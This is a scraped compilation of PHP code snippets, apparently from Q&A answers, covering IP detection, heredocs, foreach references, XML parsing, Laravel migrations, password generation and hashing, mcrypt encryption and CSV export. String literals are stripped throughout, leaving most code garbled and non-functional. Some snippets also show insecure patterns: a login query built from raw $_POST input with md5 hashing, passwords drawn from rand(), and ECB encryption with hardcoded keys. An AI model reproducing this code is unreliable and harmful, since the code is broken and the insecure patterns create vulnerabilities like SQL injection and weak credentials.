$ipaddress = if ($_SERVER[ $ipaddress = $_SERVER[ else if ($_SERVER[ $ipaddress = $_SERVER[ else if ($_SERVER[ $ipaddress = $_SERVER[ else if ($_SERVER[ $ipaddress = $_SERVER[ else if ($_SERVER[ $ipaddress = $_SERVER[ else if ($_SERVER[ $ipaddress = $_SERVER[ else $ipaddress =
function get_IP_address() { foreach (array( if (array_key_exists($key, $_SERVER) === true){ foreach (explode( $IPaddress = trim($IPaddress); if (filter_var($IPaddress, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) { return $IPaddress; } } } } }
function get_client_ip() { $ipaddress = if (getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else if(getenv( $ipaddress = getenv( else $ipaddress = return $ipaddress; }
if (isset($_GET[ $temp = $_GET[ } else { $temp = $_POST[ }
if (isset($_GET[ $temp = $_GET[ } else { $temp = $_POST[ }
`GET` - Provides a read only access to a resource. `PUT` - Used to create a new resource.
$sql = <<<SQL select * from $tablename where id in [$order_ids_list] and product_name = "widgets" SQL;
$sql = " select * from $tablename where id in [$order_ids_list] and product_name = \"widgets\" ";
$x = "The point of the \"argument" was to illustrate the use of here documents";
$x = <<<EOF The point of the "argument" was to illustrate the use of here documents EOF;
$html = <<<HTML <div class= <ul class= <li>$something</li> <li>$whatever</li> <li>$testing123</li> </ul> </div> HTML; echo $html;
$this->body = <<<HERE heredoc text sticks to the left border but it seems OK to me. HERE; $this->title = "Feedback";
$sql = "SELECT * FROM $tablename WHERE id in [$order_ids_list] AND product_name = $x =
<?php if (in_array(@$_SERVER[ { apc_clear_cache(); apc_clear_cache( apc_clear_cache( echo json_encode(array( } else { die( }
copy($apcPaths[ $url = $result = json_decode(file_get_contents($url)); if (isset($result[ { } else { } unlink($apcPaths[
<?php $result1 = apc_clear_cache(); $result2 = apc_clear_cache( $result3 = apc_clear_cache( $infos = apc_cache_info(); $infos[ $infos["apc_clear_cache( $infos["apc_clear_cache( $infos["success"] = $result1 && $result2 && $result3; header( echo json_encode($infos);
$a = array ( foreach ($a as &$v) { } foreach ($a as $v) { echo $v.PHP_EOL; }
$a = array ( foreach ($a as &$v) { } foreach ($a as $v) { echo $v. }
$a[3] = $v = $a[0], echo $v; $a[3] = $v = $a[1], echo $v; $a[3] = $v = $a[2], echo $v; $a[3] = $v = $a[3], echo $v;
<?php $a = array ( foreach ($a as &$v) { } var_dump($a); foreach ($a as $v) { var_dump($a); }
array(4) { [0]=> string(4) "zero" [1]=> string(3) "one" [2]=> string(3) "two" [3]=> &string(5) "three" } array(4) { [0]=> string(4) "zero" [1]=> string(3) "one" [2]=> string(3) "two" [3]=> &string(4) "zero" } array(4) { [0]=> string(4) "zero" [1]=> string(3) "one" [2]=> string(3) "two" [3]=> &string(3) "one" } array(4) { [0]=> string(4) "zero" [1]=> string(3) "one" [2]=> string(3) "two" [3]=> &string(3) "two" } array(4) { [0]=> string(4) "zero" [1]=> string(3) "one" [2]=> string(3) "two" [3]=> &string(3) "two" }
$a = array ( foreach ($a as &$v) { } foreach ($a as $v) { echo $v.PHP_EOL; }
$a = array ( $v = &$a[3]; for ($i = 0; $i < 4; $i++) { $v = $a[$i]; echo $v.PHP_EOL; }
$a = array ( for ($i = 0; $i < 4; $i++) { $a[3] = $a[$i]; echo $a[3].PHP_EOL; }
$a = array ( $a[3] = $a[0]; echo $a[3].PHP_EOL; $a[3] = $a[1]; echo $a[3].PHP_EOL; $a[3] = $a[2]; echo $a[3].PHP_EOL; $a[3] = $a[3]; echo $a[3].PHP_EOL;
$cb1 = $cb2 = [ $cb3 = [$object, $cb2 = $cb2(); $cb3 = array(&$object,
if (is_callable($cb2)) { $returnValue = call_user_func($cb2, $arg1, $arg2); }
function doIt($callback) { $callback(); } doIt(function() { });
function doIt($callback) { $data = "this is my data"; $callback($data); } function myCallback($data) { print } doIt(
function doIt($callback) { if(function_exists($callback)) { $callback(); } else { } }
<?php class Dispatcher { var $callback; public function Dispatcher( $callback ){ $this->callback = $callback; } public function asynchronous_method(){ if ( isset( $this->callback ) ) { if (function_exists( $this->callback )) call_user_func( $this->callback, "File done!" ); } } }
<?php include_once( $d = new Dispatcher( $d->asynchronous_method(); function do_callback( $data ){ print } ?>
function call_with_hello_and_append_world( callable $callback ) { return $callback( "hello" )."world"; } function append_space( $string ) { return $string." "; } $output1 = call_with_hello_and_append_world( function( $string ) { return $string." "; } ); var_dump( $output1 ); $output2 = call_with_hello_and_append_world( "append_space" ); var_dump( $output2 ); $old_lambda = create_function( $output3 = call_with_hello_and_append_world( $old_lambda ); var_dump( $output3 );
line --------------------------------------------------------------------------------- 3 0 > PRINT ~0 7 1 PRINT ~1 ~0 2 PRINT ~2 ~1 3 PRINT ~3 ~2 4 FREE ~3 5 > RETURN 1
<?php function bar( $baz ) { } function foo() { return print("In and out ...\n"); } if ( foo() ) { bar(); }
<?php $haystack = $needle = strpos($haystack,$needle) !== FALSE OR print "$needle not in $haystack";
print 125; PRINT 125,$temp ; print 125 and place 1 in $temp UNSET $temp ; remove $temp
ECHO var: if var is object temp = var->toString() zend_print_variable(temp) else zend_print_variable(var)
$url = "http: $url .= rawurlencode($city[$i]); $xml = simplexml_load_file($url); echo $url."\n"; $cityCode[] = array( );
SimpleXMLElement Object ( [code] => Array ( [0] => SimpleXMLElement Object ( [postalcode] => 01-935 [name] => Warszawa [countryCode] => PL [lat] => 52.25 [lng] => 21.0 [adminCode1] => SimpleXMLElement Object ( ) [adminName1] => Mazowieckie [adminCode2] => SimpleXMLElement Object ( ) [adminName2] => Warszawa [adminCode3] => SimpleXMLElement Object ( ) [adminName3] => SimpleXMLElement Object ( ) [distance] => 0.0 )
$xml = simplexml_load_file( $json_string = json_encode($xml); $result_array = json_decode($json_string, TRUE);
$value = (string) $xml->code[0]->lat; if (ctype_digit($value)) { }
$filePath = __DIR__ . $fileName = if (file_exists($filePath . $fileName)) { $xml = simplexml_load_file($filePath . $fileName); $mainNode = $xml->{ $cityArray = array(); foreach ($mainNode as $key => $data) { $cityArray[..] = $mainNode[$key][ .... } }
function _xml2array ( $xmlObject, $out = array () ){ foreach ( (array) $xmlObject as $index => $node ) $out[$index] = ( is_object ( $node ) ) ? _xml2array ( $node ) : $node; return $out; }
header("Content-Type: text/html; charset=utf8"); $url = simplexml_load_file("http: foreach ($url->PRODUCT as $product) { foreach($urun->attributes() as $k => $v) { echo $k." : ".$v. } echo }
function xml2array($xml){ $arr = array(); foreach ($xml->children() as $r) { $t = array(); if(count($r->children()) == 0) { $arr[$r->getName()] = strval($r); } else { $arr[$r->getName()][] = xml2array($r); } } return $arr; }
$codeZero = null; foreach ($xml->code->children() as $child) { $codeZero = $child; } $lat = null; foreach ($codeZero->children() as $child) { if (isset($child->lat)) { $lat = $child->lat; } }
foreach($xml->code as $vals ) { unset($geonames); $vals=(array)$vals; foreach($vals as $key => $value) { $value=(array)$value; $geonames[$key]=$value[0]; } } print_r($geonames);
<?php public function up() { Schema::create( $table->integer("paid"); }); }
public function up() { Schema::table( $table->integer( }); }
public function down() { Schema::table( $table->dropColumn( }); }
php artisan make:migration add_paid_to_users --table="users"
/** * Run the migrations. * * @return void */ public function up() { Schema::table( // }); }
Schema::create( $table->integer("paied"); $table->string("title"); $table->text("description"); $table->timestamps(); });
Schema::table( $table->string("title"); $table->text("description"); $table->timestamps(); });
php artisan make:migration add_store_id_to_users_table --table=users
<?php use Illuminate\Support\Facades\Schema; use Illuminate\Database\Schema\Blueprint; use Illuminate\Database\Migrations\Migration; class AddStoreIdToUsersTable extends Migration { /** * Run the migrations. * * @return void */ public function up() { Schema::table( $table->integer( $table->foreign( }); } /** * Reverse the migrations. * * @return void */ public function down() { Schema::table( $table->dropForeign([ $table->dropColumn( }); } }
php artisan make:migration add_paid_to_users --table=users
public function up() { Schema::table( $table->string( }); }
<?php if ( ! defined( if ( ! function_exists( { function test_method($var = { return $var; } }
function yourHelperFunction(){ $ci=& get_instance(); $ci->load->database(); $sql = "select * from table"; $query = $ci->db->query($sql); $row = $query->result(); }
{blog_entries} <h5>{title}</h5> <p>{body}</p> {/blog_entries}
<?php foreach ($blog_entries as $blog_entry): ?> <h5><?php echo $blog_entry[ <p><?php echo $blog_entry[ <?php endforeach; ?>
<?php function pre($var) { echo if(is_array($var)) { print_r($var); } else { var_dump($var); } echo } ?>
helper name = new_helper.php function test_method($data){ return $data }
$this->load->new_helper(); $result = test_method( if($result){ echo $result }
<?php $input = array("Neo", "Morpheus", "Trinity", "Cypher", "Tank"); $rand_keys = array_rand($input, 2); echo $input[$rand_keys[0]] . "\n"; echo $input[$rand_keys[1]] . "\n"; ?>
public function index() { $sessions = EventSession::all(); foreach ($sessions as $i => $session) { $sessions[$i]->available = $session->getAvailability(); } return $sessions; }
class EventSession extends Eloquent { protected $table = protected $appends = array( public function getAvailabilityAttribute() { return $this->calculateAvailability(); } }
class Book extends Eloquent { protected $table = public function toArray() { $array = parent::toArray(); $array[ return $array; } public function getUpperAttribute() { return strtoupper($this->title); } }
class Book extends Eloquent { protected $table = public function toArray() { $array = parent::toArray(); foreach ($this->getMutatedAttributes() as $key) { if ( ! array_key_exists($key, $array)) { $array[$key] = $this->{$key}; } } return $array; } public function getUpperAttribute() { return strtoupper($this->title); } }
class User extends Eloquent { protected $attributes = array( ); public function getZipCodeAttribute() { return .... } }
protected $attributes = [ protected $appends = [ public function getPictureDataAttribute() { $file = Storage::get($this->picture); $type = Storage::mimeType($this->picture); return "data:" . $type . ";base64," . base64_encode($file); }
public function getAgeAttribute() { return Carbon::createFromFormat( }
1. <?php echo 1.1; ?> 2. <?php echo 1...1; ?> 3. <?php echo 1.. 4. <?php var_dump(1.); ?> 5. <?php var_dump(.1); ?>
{ "type": "donut", "name": "Cake", "toppings": [ { "id": "5002", "type": "Glazed" }, { "id": "5006", "type": "Chocolate with Sprinkles" }, { "id": "5004", "type": "Maple" } ] }
$json = ' { "type": "donut", "name": "Cake" } $yummy = json_decode($json); echo $yummy->type;
$json = ' [ "Glazed", "Chocolate with Sprinkles", "Maple" ] $toppings = json_decode($json); echo $toppings[1];
foreach ($toppings as $topping) { echo $topping, "\n"; }
$json = ' { "type": "donut", "name": "Cake", "toppings": [ { "id": "5002", "type": "Glazed" }, { "id": "5006", "type": "Chocolate with Sprinkles" }, { "id": "5004", "type": "Maple" } ] } $yummy = json_decode($json); echo $yummy->toppings[2]->id;
$json = ' { "type": "donut", "name": "Cake", "toppings": [ { "id": "5002", "type": "Glazed" }, { "id": "5006", "type": "Chocolate with Sprinkles" }, { "id": "5004", "type": "Maple" } ] } $yummy = json_decode($json, true); echo $yummy[
$json = ' { "type": "donut", "name": "Cake", "toppings": [ { "id": "5002", "type": "Glazed" }, { "id": "5006", "type": "Chocolate with Sprinkles" }, { "id": "5004", "type": "Maple" } ] } $yummy = json_decode($json); print_r($yummy);
stdClass Object ( [type] => donut [name] => Cake [toppings] => Array ( [0] => stdClass Object ( [id] => 5002 [type] => Glazed ) [1] => stdClass Object ( [id] => 5006 [type] => Chocolate with Sprinkles ) [2] => stdClass Object ( [id] => 5004 [type] => Maple ) ) )
$json = $thing = json_decode($json); echo $thing->{
$json = ' { "type": "donut", "name": "Cake", "toppings": "[{ \"type\": \"Glazed\" }, { \"type\": \"Maple\" }]" } $yummy = json_decode($json); $toppings = json_decode($yummy->toppings); echo $toppings[0]->type;
$json = var_dump(json_decode($json)); var_dump(json_decode($json, true));
object(stdClass) ["a"] => int(1) ["b"] => int(2) ["c"] => int(3) ["d"] => int(4) ["e"] => int(5) } array(5) { ["a"] => int(1) ["b"] => int(2) ["c"] => int(3) ["d"] => int(4) ["e"] => int(5) }
require try { include } catch(Exception $e) { echo "something strange happened!"; }
function exception_error_handler($errno, $errstr, $errfile, $errline ) { throw new ErrorException($errstr, 0, $errno, $errfile, $errline); } set_error_handler("exception_error_handler");
<?PHP echo "Firstline"; include( echo "I will run if include but not on Require"; ?>
server { listen 80; Virtual Host Name server_name www.example.com example.com; location / { root /home/demo/sites/example.com/public_html; index index.php index.htm index.html; } location ~ \.php$ { fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param PATH_INFO $fastcgi_script_name; fastcgi_param SCRIPT_FILENAME /home/demo/sites/example.com/public_html$fastcgi_script_name; include fastcgi_params; } }
Expression Boolean $x = ""; FALSE $x = null; FALSE var $x; FALSE $x is undefined FALSE $x = array(); FALSE $x = array( $x = false; FALSE $x = true; TRUE $x = 1; TRUE $x = 42; TRUE $x = 0; FALSE $x = -1; TRUE $x = "1"; TRUE $x = "0"; FALSE $x = "-1"; TRUE $x = "php"; TRUE $x = "true"; TRUE $x = "false"; TRUE
function randomPassword() { $alphabet = "abcdefghijklmnopqrstuwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789"; for ($i = 0; $i < 8; $i++) { $n = rand(0, count($alphabet)-1); $pass[$i] = $alphabet[$n]; } return $pass; }
function randomPassword() { $alphabet = $pass = array(); $alphaLength = strlen($alphabet) - 1; for ($i = 0; $i < 8; $i++) { $n = rand(0, $alphaLength); $pass[] = $alphabet[$n]; } return implode($pass); }
$bytes = openssl_random_pseudo_bytes(2); $pwd = bin2hex($bytes);
<?php /** * Generate a random string, using a cryptographically secure * pseudorandom number generator (random_int) * * For PHP 7, random_int is a PHP core function * For PHP 5.x, depends on https: * * @param int $length How many characters do we want? * @param string $keyspace A string of all possible characters * to select from * @return string */ function random_str( $length, $keyspace = ) { $str = $max = mb_strlen($keyspace, if ($max < 1) { throw new Exception( } for ($i = 0; $i < $length; ++$i) { $str .= $keyspace[random_int(0, $max)]; } return $str; }
function rand_string( $length ) { $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; return substr(str_shuffle($chars),0,$length); } echo rand_string(8);
function generate_password($length = 20){ $chars = $str = $max = strlen($chars) - 1; for ($i=0; $i < $length; $i++) $str .= $chars[random_int(0, $max)]; return $str; }
function generate_password($length = 20){ $chars = $str = $max = strlen($chars) - 1; for ($i=0; $i < $length; $i++) $str .= $chars[mt_rand(0, $max)]; return $str; }
$factory = new RandomLib\Factory; $generator = $factory->getGenerator(new SecurityLib\Strength(SecurityLib\Strength::MEDIUM)); $passwordLength = 8; $randomPassword = $generator->generateString($passwordLength);
/** * @param int $length */ function strong_random_bytes($length) { $strong = false; $bytes = openssl_random_pseudo_bytes($length, $strong); if ( ! $strong) { throw new Exception( } return $bytes; }
base64_encode(strong_random_bytes(intval(ceil($n * 3 / 4))));
$dirty_pass = base64_encode(strong_random_bytes(8))); $pass = substr(str_replace([
function base64urlEncode($data) { return rtrim(strtr(base64_encode($data), } function secureId($length = 32) { if (function_exists( $bytes = openssl_random_pseudo_bytes($length); return rtrim(strtr(base64_encode($bytes), } else { error_log("Missing support for openssl_random_pseudo_bytes"); $pr_bits = $fp = @fopen( if ($fp !== false) { $pr_bits .= @fread($fp, $length); @fclose($fp); } if (strlen($pr_bits) < $length) { error_log( throw new \Exception( } return base64urlEncode($pr_bits); } }
function randompassword() { $fp = fopen ("/dev/urandom", if (!$fp) { die ("Can $random = fread ($fp, 1024); fclose ($fp); return trim (base64_encode ( md5 ($random, true)), "="); }
$password_string = $password = substr(str_shuffle($password_string), 0, 12);
function strand($length){ if($length > 0) return chr(rand(33, 126)) . strand($length - 1); }
function generatePassword($_len) { $_alphaSmall = $_alphaCaps = strtoupper($_alphaSmall); $_numerics = $_specialChars = $_container = $_alphaSmall.$_alphaCaps.$_numerics.$_specialChars; $password = for($i = 0; $i < $_len; $i++) { $_rand = rand(0, strlen($_container) - 1); $password .= substr($_container, $_rand, 1); } return $password; }
$pw = chr(mt_rand(97,122)).mt_rand(0,9).chr(mt_rand(97,122)).mt_rand(10,99).chr(mt_rand(97,122)).mt_rand(100,999);
str_shuffle( rtrim( base64_encode(bin2hex(openssl_random_pseudo_bytes(5))), ). strtoupper(bin2hex(openssl_random_pseudo_bytes(7))). bin2hex(openssl_random_pseudo_bytes(13)) )
<?php /** * @usage : * include_once($path . * $Password = new Password; * $pwd = $Password->createPassword(10); * return $pwd; * */ class Password { public function createPassword($length = 15) { $response = []; $response[ $response[ return $response; } private function generate($length = 15) { $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@ return substr(str_shuffle($chars),0,$length); } private function hashPwd($pwd) { return hash( } } ?>
$char = [range( $pw = for($a = 0; $a < count($char); $a++) { $randomkeys = array_rand($char[$a], 2); $pw .= $char[$a][$randomkeys[0]].$char[$a][$randomkeys[1]]; } $userPassword = str_shuffle($pw);
<?php $length = 8; $chars = array_merge(range(0,9), range( shuffle($chars); $code = implode(array_slice($chars, 0, $length)); $arr = array($code); $password = implode("",$arr); echo $password;
$p_lc_letters = substr(str_shuffle( $p_uc_letters = substr(str_shuffle( $p_numbers = substr(str_shuffle( echo $password = substr(str_shuffle($p_lc_letters.
<?php /** * Generates a random password with the given length and of the given type. * * @param int $length * @param string $type * @return string | null */ function random_password($length=8, $type= if ($length < 1 || $length > 1024) return null; $lower = $upper = strtoupper($lower); $numbers = $dash = $underscore = $symbols = switch ($type) { case $chars = $lower; break; case $chars = $upper; break; case $chars = $numbers; break; case $chars = $lower . $upper; break; case $chars = $symbols . $dash . $underscore; break; case $chars = $lower . $upper . $numbers; break; case $chars = $lower . $upper . $numbers . $dash; break; case $chars = $lower . $upper . $numbers . $underscore; break; case $chars = $lower . $upper . $numbers . $underscore . $dash; break; case $chars = $lower . $upper . $numbers . $underscore . $dash . $symbols; break; default: return null; } $min = 0; $max = strlen($chars) - 1; $password = for ($i = 0; $i < $length; $i++) { $random = mt_rand($min, $max); $char = substr($chars, $random, 1); $password .= $char; } return $password; }
use Illuminate\Database\Query\Builder; Builder::macro( $randomFunctions = [ ]; $driver = $this->getConnection()->getDriverName(); return $this->orderByRaw($randomFunctions[$driver]); });
$randomUser = DB::table( ->inRandomOrder() ->first();
public function scopeRandomize($query, $limit = 3, $exclude = []) { $query = $query->whereRaw( if (!empty($exclude)) { $query = $query->whereNotIn( } return $query; }
$count = MyModel::where( $random_id = rand(1, $count - 1); $data = MyModel::where(
$salt = $password = md5($salt.$_POST[ $result = mysql_query("SELECT id FROM users WHERE username = AND password = if (mysql_num_rows($result) < 1) { echo "The username or password you entered is incorrect."; } else { $_SESSION[ echo "Hello $_SESSION[id]!"; }
<?php $hash = password_hash($_POST[ $checked = password_verify($_POST[ if ($checked) { echo } else { echo }
<?php use Netsilik/Lib/PepperedPasswords; $config[ $hasher = new PepperedPasswords($config[ $hash = $hasher->hash($_POST[ $checked = $hasher->verify($_POST[ if ($checked) { echo } else { echo }
<?php require( $pwdHasher = new PasswordHash(8, FALSE); $hash = $pwdHasher->HashPassword( $password ); $checked = $pwdHasher->CheckPassword($password, $hash); if ($checked) { echo } else { echo }
<?php var_dump(password_hash("my-secret-password", PASSWORD_DEFAULT)); $options = array( ); var_dump(password_hash("my-secret-password", PASSWORD_BCRYPT, $options)); ?>
string(60) "$2y$10$w2LxXdIcqJpD6idFTNn.eeZbKesdu5y41ksL22iI8C4/6EweI7OK." string(60) "$2y$07$TphfsM82o1uEKlfP9vf1fOKohBqGVXOJEmnUtQu7Y1UMft1R4D3d."
var_dump(password_verify("my-secret-password", var_dump(password_verify("wrong-password", var_dump(password_verify("my-secret-password", var_dump(password_verify("wrong-password",
/** * A class to handle secure encryption and decryption of arbitrary data * * Note that this is not just straight encryption. It also has a few other * features in it to make the encrypted data far more secure. Note that any * other implementations used to decrypt data will have to do the same exact * operations. * * Security Benefits: * * - Uses Key stretching * - Hides the Initialization Vector * - Does HMAC verification of source data * */ class Encryption { /** * @var string $cipher The mcrypt cipher to use for this instance */ protected $cipher = /** * @var int $mode The mcrypt cipher mode to use */ protected $mode = /** * @var int $rounds The number of rounds to feed into PBKDF2 for key generation */ protected $rounds = 100; /** * Constructor! * * @param string $cipher The MCRYPT_* cypher to use for this instance * @param int $mode The MCRYPT_MODE_* mode to use for this instance * @param int $rounds The number of PBKDF2 rounds to do on the key */ public function __construct($cipher, $mode, $rounds = 100) { $this->cipher = $cipher; $this->mode = $mode; $this->rounds = (int) $rounds; } /** * Decrypt the data with the provided key * * @param string $data The encrypted datat to decrypt * @param string $key The key to use for decryption * * @returns string|false The returned string if decryption is successful * false if it is not */ public function decrypt($data, $key) { $salt = substr($data, 0, 128); $enc = substr($data, 128, -64); $mac = substr($data, -64); list ($cipherKey, $macKey, $iv) = $this->getKeys($salt, $key); if (!hash_equals(hash_hmac( return false; } $dec = mcrypt_decrypt($this->cipher, $cipherKey, $enc, $this->mode, $iv); $data = $this->unpad($dec); return $data; } /** * Encrypt the supplied data using the supplied key * * @param string $data The data to encrypt * @param string $key The key to encrypt with * * @returns string The encrypted data */ public function encrypt($data, $key) { $salt = mcrypt_create_iv(128, MCRYPT_DEV_URANDOM); list ($cipherKey, $macKey, $iv) = $this->getKeys($salt, $key); $data = $this->pad($data); $enc = mcrypt_encrypt($this->cipher, $cipherKey, $data, $this->mode, $iv); $mac = hash_hmac( return $salt . $enc . $mac; } /** * Generates a set of keys given a random salt and a master key * * @param string $salt A random string to change the keys each encryption * @param string $key The supplied key to encrypt with * * @returns array An array of keys (a cipher key, a mac key, and a IV) */ protected function getKeys($salt, $key) { $ivSize = mcrypt_get_iv_size($this->cipher, $this->mode); $keySize = mcrypt_get_key_size($this->cipher, $this->mode); $length = 2 * $keySize + $ivSize; $key = $this->pbkdf2( $cipherKey = substr($key, 0, $keySize); $macKey = substr($key, $keySize, $keySize); $iv = substr($key, 2 * $keySize); return array($cipherKey, $macKey, $iv); } /** * Stretch the key using the PBKDF2 algorithm * * @see http: * * @param string $algo The algorithm to use * @param string $key The key to stretch * @param string $salt A random salt * @param int $rounds The number of rounds to derive * @param int $length The length of the output key * * @returns string The derived key. */ protected function pbkdf2($algo, $key, $salt, $rounds, $length) { $size = strlen(hash($algo, $len = ceil($length / $size); $result = for ($i = 1; $i <= $len; $i++) { $tmp = hash_hmac($algo, $salt . pack( $res = $tmp; for ($j = 1; $j < $rounds; $j++) { $tmp = hash_hmac($algo, $tmp, $key, true); $res ^= $tmp; } $result .= $res; } return substr($result, 0, $length); } protected function pad($data) { $length = mcrypt_get_block_size($this->cipher, $this->mode); $padAmount = $length - strlen($data) % $length; if ($padAmount == 0) { $padAmount = $length; } return $data . str_repeat(chr($padAmount), $padAmount); } protected function unpad($data) { $length = mcrypt_get_block_size($this->cipher, $this->mode); $last = ord($data[strlen($data) - 1]); if ($last > $length) return false; if (substr($data, -1 * $last) !== str_repeat(chr($last), $last)) { return false; } return substr($data, 0, -1 * $last); } }
function hash_equals($a, $b) { $key = mcrypt_create_iv(128, MCRYPT_DEV_URANDOM); return hash_hmac( }
$e = new Encryption(MCRYPT_BLOWFISH, MCRYPT_MODE_CBC); $encryptedData = $e->encrypt($data, $key);
$e2 = new Encryption(MCRYPT_BLOWFISH, MCRYPT_MODE_CBC); $data = $e2->decrypt($encryptedData, $key);
function makeKey($userKey, $serverKey, $userSuppliedKey) { $key = hash_hmac( $key = hash_hmac( return $key; }
<?php $iv_size = mcrypt_get_iv_size(MCRYPT_BLOWFISH, MCRYPT_MODE_ECB); $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND); $key = "This is a very secret key"; $pass = "PasswordHere"; echo strlen($pass) . "\n"; $crypttext = mcrypt_encrypt(MCRYPT_BLOWFISH, $key, $pass, MCRYPT_MODE_ECB, $iv); echo strlen($crypttext) . "\n"; ?>
$td = mcrypt_module_open( $iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($td), MCRYPT_RAND); $key = substr("SUPERSECRETKEY",0,mcrypt_enc_get_key_size($td)); mcrypt_generic_init($td, $key, $iv); $encrypted = mcrypt_generic($td, $unencrypted); $encrypted = $ua."||||".$iv; mcrypt_generic_deinit($td); mcrypt_module_close($td); $encrypted = base64_encode($encrypted); $encrypted = array_shift(unpack(
$encrypted = pack( $encrypted = base64_decode($encrypted); list($encrypted,$iv) = explode("||||",$encrypted,2); $td = mcrypt_module_open( $key = substr("SUPERSECRETKEY",0,mcrypt_enc_get_key_size($td)); mcrypt_generic_init($td, $key, $iv); $unencrypted = mdecrypt_generic($td, $encrypted); mcrypt_generic_deinit($td); mcrypt_module_close($td);
$iv_size = mcrypt_get_iv_size(MCRYPT_BLOWFISH , MCRYPT_MODE_ECB); $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND); $key = "evenifyouaccessmydatabaseyouwillneverfindmyemail"; $text = "myemail@domain.com"; echo "Key : ".$key."<br/>"; echo "Text : ".$text . "<br/>"; echo "Md5 : ".md5($text). "<br/>"; echo "Sha1 : ".sha1($text). "<br/>"; $crypttext = mcrypt_encrypt(MCRYPT_BLOWFISH , $key, $text, MCRYPT_MODE_ECB, $iv); echo "Crypted Data : ".$crypttext."<br>"; $base64 = base64_encode($crypttext); echo "Encoded Data : ".$base64."<br/>"; $decode = base64_decode($base64); $decryptdata = mcrypt_decrypt(MCRYPT_BLOWFISH , $key, $crypttext, MCRYPT_MODE_ECB, $iv); echo "Decoded Data : ".ereg_replace("?", null , $decryptdata);
<?php /** * In this case, we want to increase the default cost for BCRYPT to 12. * Note that we also switched to BCRYPT, which will always be 60 characters. */ $options = [ ]; echo password_hash("rasmuslerdorf", PASSWORD_BCRYPT, $options)."\n"; ?>
<?php $hash = if (password_verify( echo } else { echo } ?>
phpize Cannot find config.m4. Make sure that you run
sudo apt-get install php5-dev sudo apt-get install php7.0-dev
sudo apt-get install libcurl3 php5-dev libcurl4-gnutls-dev libmagic-dev sudo apt-get install php-http make sudo pecl install pecl_http
PHP 7.2.3-1ubuntu1 (cli) (built: Mar 14 2018 22:03:58) ( NTS ) Copyright (c) 1997-2018 The PHP Group Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies with Zend OPcache v7.2.3-1ubuntu1, Copyright (c) 1999-2018, by Zend Technologies
<strong>Look just like this line - so then know how to type it</strong>
<?php $new = htmlspecialchars("<a href= echo $new; ?>
&lt;strong&gt;Look just like this line - so then know how to type it&lt;/strong&gt;
echo htmlentities("<strong>Look just like this line - so then know how to type it</strong>");
<strong>Look just like this line - so then know how to type it</strong>
header("content-type:application/csv;charset=UTF-8"); header("Content-Disposition:attachment;filename=\"CHS.csv\"");
header( header( header( header( header( header( header( echo "\xEF\xBB\xBF"; echo $csv_file_content; exit();
function excel_export($tsv_data, $filename) { $export_data = preg_split("/\n/", $tsv_data); foreach($export_data as &$row) { $row = preg_split("/\t/", $row); } include("includes/PHPExcel.php"); include( $objPHPExcel = new PHPExcel(); $objPHPExcel->setActiveSheetIndex(0); $sheet = $objPHPExcel->getActiveSheet(); $row = $col = "A"; foreach($export_data as $row_cells) { if(!is_array($row_cells)) { continue; } foreach($row_cells as $cell) { $sheet->setCellValue($col.$row, $cell); $col++; } $row += 1; $col = "A"; } $objWriter = new PHPExcel_Writer_Excel5($objPHPExcel); header( header( header( $objWriter->save( exit; }
header ( header ( header ( header ( header ( print chr(255) . chr(254) . mb_convert_encoding($tsv_data, exit;
header( header( header(sprintf( header( header( header( header( $df = fopen( fputs( $df, "\xEF\xBB\xBF" ); foreach ( $rows as $row ) { fputcsv( $df, $row ); } fclose($df); exit();
$out = fopen( fprintf($out, chr(0xEF).chr(0xBB).chr(0xBF)); fputcsv($out, $some_csv_strings);
function writeCSV($filename, $headings, $data) { $newTab = "\t"; $newLine = "\n"; $fputcsv = count($headings) ? if (! empty($data)) { foreach($data as $item) { $fputcsv .= } } $encoded_csv = mb_convert_encoding($fputcsv, header( header("Pragma: public"); header("Expires: 0"); header("Cache-Control: must-revalidate, post-check=0, pre-check=0"); header("Cache-Control: private",false); header("Content-Type: application/octet-stream"); header("Content-Disposition: attachment; filename=\"$filename.csv\";" ); header("Content-Transfer-Encoding: binary"); header( echo chr(255) . chr(254) . $encoded_csv; exit; }
<?php $file = fopen( "file.csv", "w"); fprintf( $file, "\xEF\xBB\xBF"); fputcsv( $file, ["english", 122, "বাংলা"]); fclose($file);
$response->headers->set( $response->headers->set( $response->headers->set( $response->headers->set( $response->headers->set( echo "\xEF\xBB\xBF";
**This is 100% works fine in excel for both Windows7,8,10 and also All Mac OS.** function generateCSVFile($filename, $headings, $data) { $newTab = "\t"; $newLine = "\n"; $fputcsv = count($headings) ? if (! empty($data)) { foreach($data as $item) { $fputcsv .= } } $encoded_csv = mb_convert_encoding($fputcsv, header( header("Pragma: public"); header("Expires: 0"); header("Cache-Control: must-revalidate, post-check=0, pre-check=0"); header("Cache-Control: private",false); header("Content-Type: application/octet-stream"); header("Content-Disposition: attachment; filename=\"$filename.csv\";" ); header("Content-Transfer-Encoding: binary"); header( echo chr(255) . chr(254) . $encoded_csv; exit; }
$csvString = "Möckmühl;in Möckmühl ist die Hölle los\n"; file_put_contents(
header( header( header("Content-Disposition: attachment; filename={$filename}");
private function convertToWindowsCharset($string) { $encoding = mb_detect_encoding($string); return iconv($encoding, "Windows-1252", $string); }
$newContent = chr(239) . chr(187) . chr(191) . $originalContent
FileOutputStream fStream = new FileOutputStream( f ); final byte[] bom = new byte[] { (byte) 0xEF, (byte) 0xBB, (byte) 0xBF }; OutputStreamWriter writer = new OutputStreamWriter( fStream, "UTF8" ); fStream.write( bom );
header("Content-type: application/x-download"); header("Content-Transfer-Encoding: binary"); header("Content-disposition: attachment; filename=".$fileName.""); header("Cache-control: private"); echo utf8_decode($output);
